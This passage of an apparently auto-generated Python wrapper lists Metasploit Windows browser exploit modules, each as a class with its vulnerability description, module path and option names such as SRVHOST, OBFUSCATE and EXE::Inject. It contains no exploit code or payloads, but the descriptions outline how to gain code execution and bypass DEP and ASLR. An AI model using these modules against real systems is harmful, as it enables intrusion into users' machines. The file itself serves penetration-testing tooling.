        .NET 2.0 'mscorie.dll' module to bypass DEP and ASLR. This module does not
        opt-in to ASLR. As such, this module should be reliable on all Windows
        versions with .NET 2.0.50727 installed.
      
		"""

		path = 'windows/browser/ms11_003_ie_css_import'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_ms12_004_midi(object):
		"""
		
          This module exploits a heap overflow vulnerability in the Windows Multimedia
        Library (winmm.dll). The vulnerability occurs when parsing specially crafted
        MIDI files.  Remote code execution can be achieved by using the Windows Media Player
        ActiveX control.

          Exploitation is done by supplying a specially crafted MIDI file with
        specific events, causing the offset calculation being higher than what is
        available on the heap (0x400 allocated by WINMM!winmmAlloc), and then allowing
        us to either "inc al" or "dec al" a byte.  This can be used to corrupt an array
        (CImplAry) we setup, and force the browser to confuse types from tagVARIANT objects,
        which leverages remote code execution under the context of the user.

          Note: At this time, for IE 8 target, msvcrt ROP is used by default. However,
        if you know your target's patch level, you may also try the 'MSHTML' advanced
        option for an info leak based attack.  Currently, this module only supports two
        MSHTML builds: 8.0.6001.18702, which is often seen in a newly installed XP SP3.
        Or 8.0.6001.19120, which is patch level before the MS12-004 fix.

          Also, based on our testing, the vulnerability does not seem to trigger when
        the victim machine is operated via rdesktop.
      
		"""

		path = 'windows/browser/ms12_004_midi'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'
			MSHTML = 'MSHTML'

	class windows_browser_ms08_053_mediaencoder(object):
		"""
		
          This module exploits a stack buffer overflow in Windows Media Encoder 9. When
        sending an overly long string to the GetDetailsString() method of wmex.dll
        an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/browser/ms08_053_mediaencoder'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_sapgui_saveviewtosessionfile(object):
		"""
		
          This module exploits a stack buffer overflow in Siemens Unigraphics Solutions
        Teamcenter Visualization EAI WebViewer3D ActiveX control that is bundled
        with SAPgui. When passing an overly long string the SaveViewToSessionFile()
        method, arbitrary code may be executed.
      
		"""

		path = 'windows/browser/sapgui_saveviewtosessionfile'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms06_057_webview_setslice(object):
		"""
		
        This module exploits a flaw in the WebViewFolderIcon ActiveX control
      included with Windows 2000, Windows XP, and Windows 2003. This flaw was published
      during the Month of Browser Bugs project (MoBB #18).
      
		"""

		path = 'windows/browser/ms06_057_webview_setslice'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms09_072_style_object(object):
		"""
		
        This module exploits a vulnerability in the getElementsByTagName function
      as implemented within Internet Explorer.
      
		"""

		path = 'windows/browser/ms09_072_style_object'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms10_026_avi_nsamplespersec(object):
		"""
		
          This module exploits a buffer overlow in l3codecx.ax while processing a
        AVI files with MPEG Layer-3 audio contents. The overflow only allows to overwrite
        with 0's so the three least significant bytes of EIP saved on stack are
        overwritten and shellcode is mapped using the .NET DLL memory technique pioneered
        by Alexander Sotirov and Mark Dowd.

        Please note on IE 8 targets, your malicious URL must be a trusted site in order
        to load the .Net control.
      
		"""

		path = 'windows/browser/ms10_026_avi_nsamplespersec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_viscom_movieplayer_drawtext(object):
		"""
		
          Stack-based buffer overflow in the MOVIEPLAYER.MoviePlayerCtrl.1 ActiveX control
        in MoviePlayer.ocx 6.8.0.0 in Viscom Software Movie Player Pro SDK ActiveX 6.8 allows
        remote attackers to execute arbitrary code via a long strFontName parameter to the
        DrawText method.

        The victim will first be required to trust the publisher Viscom Software.
        This module has been designed to bypass DEP and ASLR under XP IE8, Vista and Win7
        with Java support.
      
		"""

		path = 'windows/browser/viscom_movieplayer_drawtext'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_facebook_extractiptc(object):
		"""
		
          This module exploits a stack buffer overflow in Facebook Photo Uploader 4.
        By sending an overly long string to the "ExtractIptc()" property located
        in the ImageUploader4.ocx (4.5.57.0) Control, an attacker may be able to execute
        arbitrary code.
      
		"""

		path = 'windows/browser/facebook_extractiptc'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ubisoft_uplay_cmd_exec(object):
		"""
		
        The uplay ActiveX component allows an attacker to execute any command line action.
        User must sign in, unless auto-sign in is enabled and uplay must not already be
        running.  Due to the way the malicious executable is served (WebDAV), the module
        must be run on port 80, so please make sure you have enough privilege to do that.
        Ubisoft released patch 2.04 as of Mon 20th July.
      
		"""

		path = 'windows/browser/ubisoft_uplay_cmd_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			EXPLOITPATH = 'EXPLOITPATH'

	class windows_browser_adobe_flash_uncompress_zlib_uninitialized(object):
		"""
		
        This module exploits an unintialized memory vulnerability in Adobe Flash Player. The
        vulnerability occurs in the ByteArray::UncompressViaZlibVariant method, which fails
        to initialize allocated memory. When using a correct memory layout this vulnerability
        leads to a ByteArray object corruption, which can be abused to access and corrupt memory.
        This module has been tested successfully on Windows 7 SP1 (32-bit), IE 8 and IE11 with
        Flash 15.0.0.189.
      
		"""

		path = 'windows/browser/adobe_flash_uncompress_zlib_uninitialized'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'

	class windows_browser_hp_easy_printer_care_xmlsimpleaccessor(object):
		"""
		
          This module allows remote attackers to place arbitrary files on a users file
        system by abusing via Directory Traversal attack the "saveXML" method from the
        "XMLSimpleAccessor" class in the HP Easy Printer HPTicketMgr.dll ActiveX Control
        (HPTicketMgr.dll 2.7.2.0).

          Code execution can be achieved by first uploading the payload to the remote
        machine embeddeding a vbs file, and then upload another mof file, which enables Windows
        Management Instrumentation service to execute the vbs. Please note that this
        module currently only works for Windows before Vista.
      
		"""

		path = 'windows/browser/hp_easy_printer_care_xmlsimpleaccessor'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_greendam_url(object):
		"""
		
          This module exploits a stack-based buffer overflow in Green Dam Youth Escort
        version 3.17 in the way it handles overly long URLs.
        By setting an overly long URL, an attacker can overrun a buffer and execute
        arbitrary code. This module uses the .NET DLL memory technique by Alexander
        Sotirov and Mark Dowd and should bypass DEP, NX and ASLR.
      
		"""

		path = 'windows/browser/greendam_url'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ntr_activex_stopmodule(object):
		"""
		
          This module exploits a vulnerability found in the NTR ActiveX 1.1.8. The
        vulnerability exists in the StopModule() method, where the lModule parameter is
        used to dereference memory to get a function pointer, which leads to code execution
        under the context of the user visiting a malicious web page.
      
		"""

		path = 'windows/browser/ntr_activex_stopmodule'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_ibm_tivoli_pme_activex_bof(object):
		"""
		
          This module exploits a buffer overflow vulnerability in the
        Isig.isigCtl.1 ActiveX installed with IBM Tivoli Provisioning
        Manager Express for Software Distribution 4.1.1.

        The vulnerability is found in the "RunAndUploadFile" method
        where the "OtherFields" parameter with user controlled data
        is used to build a "Content-Dispoition" header and attach
        contents in a insecure way which allows to overflow a buffer
        in the stack.
      
		"""

		path = 'windows/browser/ibm_tivoli_pme_activex_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_citrix_gateway_actx(object):
		"""
		
          This module exploits a stack based buffer overflow in the Citrix Gateway
        ActiveX control. Exploitation of this vulnerability requires user interaction.
        The victim must click a button in a dialog to begin a scan. This is typical
        interaction that users should be accustom to.

          Exploitation results in code execution with the privileges of the user who
        browsed to the exploit page.
          
		"""

		path = 'windows/browser/citrix_gateway_actx'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms13_069_caret(object):
		"""
		
        This module exploits a use-after-free vulnerability found in Internet Explorer,
        specifically in how the browser handles the caret (text cursor) object. In IE's standards
        mode, the caret handling's vulnerable state can be triggered by first setting up an
        editable page with an input field, and then we can force the caret to update in an
        onbeforeeditfocus event by setting the body's innerHTML property. In this event handler,
        mshtml!CCaret::`vftable' can be freed using a document.write() function, however,
        mshtml!CCaret::UpdateScreenCaret remains unaware of this change, and still uses the
        same reference to the CCaret object. When the function tries to use this invalid reference
        to call a virtual function at offset 0x2c, it finally results a crash. Precise control of
        the freed object allows arbitrary code execution under the context of the user.
      
		"""

		path = 'windows/browser/ms13_069_caret'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_asus_net4switch_ipswcom(object):
		"""
		
          This module exploits a vulnerability found in ASUS Net4Switch's ipswcom.dll
        ActiveX control.  A buffer overflow condition is possible in multiple places due
        to the use of the CxDbgPrint() function, which allows remote attackers to gain
        arbitrary code execution under the context of the user.
      
		"""

		path = 'windows/browser/asus_net4switch_ipswcom'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_barcode_ax49(object):
		"""
		
        This module exploits a stack buffer overflow in RKD Software Barcode Application
        ActiveX Control 'BarCodeAx.dll'. By sending an overly long string to the BeginPrint
        method of BarCodeAx.dll v4.9, an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/browser/barcode_ax49'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_mirc_irc_url(object):
		"""
		
          This module exploits a stack buffer overflow in mIRC 6.1. By
        submitting an overly long and specially crafted URL to
        the 'irc' protocol, an attacker can overwrite the buffer
        and control program execution.
      
		"""

		path = 'windows/browser/mirc_irc_url'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
